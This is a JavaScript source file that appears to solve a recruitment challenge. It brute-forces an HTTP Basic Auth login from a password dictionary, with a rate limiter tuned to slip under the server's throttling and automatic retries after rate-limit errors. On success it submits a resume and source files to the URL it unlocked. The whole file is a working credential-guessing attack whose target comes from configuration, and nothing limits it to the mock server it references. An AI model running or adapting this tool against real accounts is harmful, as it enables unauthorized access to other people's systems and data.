import 'dotenv/config';
import fs from 'fs';
import axios from 'axios';
import Bottleneck from 'bottleneck';
import { submitResume } from './submit.js'

//Config:
const TARGET_URL = process.env.TARGET_API_URL;
const USERNAME = process.env.USERNAME;
const CV_PATH = process.env.RESUME_PATH;

//Define rate limiter:
const limiter = new Bottleneck({ minTime: 112 }); //slow down requests to just under 9/s to be safe.

//Check Password

async function checkPassword(password) {

    try {
        const response = await axios.get(TARGET_URL, {
            auth: {username: USERNAME, password: password}
        });

        //Success case:
        console.log(`Success, Password is: ${password}`);
        return {success: true, url: response.data.url };

    }catch (error) {
        if (error.response?.status === 401){
            console.log(`Incorrect Password: ${password}`);
        }else if (error.response?.status === 429) {
            console.warn(`RATE LIMIT HIT for ${password}.`);
            return { success: false, retry: true, password: password };
        }else {
            console.error(`Error for ${password}:`, error.message);
        }
        return { success: false };
    }
    
}

//Attack function:
async function startAttack() {
    const passwords = fs.readFileSync('dict.txt', 'utf-8').split('\n').filter(p => p.trim() !== '');
    console.log(`Trying ${passwords.length} passwords. Target: ${TARGET_URL}`);

    const wrappedCheck = limiter.wrap(checkPassword);
    let successfullURL = null;
    let attackComplete = false; 

    //Queue all password checks immediately:
    const promises = passwords.map((password) => {
        // Only queue the password check if we haven't already succeeded
        if (attackComplete) return null;

        return wrappedCheck(password)
            .then(result => {
                if (result?.success) {
                    //Set success flags
                    successfullURL = result.url;
                    attackComplete = true; 
                    // Cancel remaining jobs in Bottleneck queue.
                    limiter.stop(); 
                }

                if (result?.retry && !attackComplete) {
                    // Queue the failed request back
                    return wrappedCheck(result.password)
                        .then(res => {
                            if (res?.success) {
                                successfullURL = res.url;
                                attackComplete = true;
                                limiter.stop();
                            }
                        });
                }
                return result;
            })
            .catch(e => {
                // Suppress the expected limiter has been stopped error
                if (e.message && e.message.includes("limiter has been stopped")) {
                    // Do nothing
                } else {
                    console.error("An unexpected error occurred during password queueing:", e);
                }
            });
    });

    await Promise.all(promises.filter( p => p !== null)); //Must filter out the nuls because of the early exit.

    if (successfullURL) {
        console.log('Attack finished. URL: ', successfullURL);
        const sourceFiles = ['attack.js', 'submit.js', 'generateDict.js', 'package.json', '../README.md', '.env.example', '../mock-api/server.js', '../mock-api/package.json', '../mock-api/.env.example'];
        await submitResume(successfullURL, CV_PATH, sourceFiles, 'dict.txt');
    } else {
        console.log("Attack finished. Password not found.");
    }
}

startAttack();